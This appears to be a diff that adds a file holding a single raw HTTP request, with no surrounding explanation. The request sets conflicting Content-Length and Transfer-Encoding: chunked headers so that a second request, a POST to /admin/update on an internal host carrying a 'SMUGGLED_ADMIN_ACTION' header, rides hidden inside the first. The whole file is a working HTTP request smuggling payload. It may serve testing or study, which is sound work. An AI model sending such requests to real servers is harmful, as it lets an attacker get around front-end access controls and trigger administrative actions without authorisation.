@@ -1,0 +1,11 @@
+POST / HTTP/1.1
+Host: internal.service
+Content-Length: 6
+Transfer-Encoding: chunked
+
+0
+
+POST /admin/update HTTP/1.1
+Host: internal.service
+X-Payload: SMUGGLED_ADMIN_ACTION
+
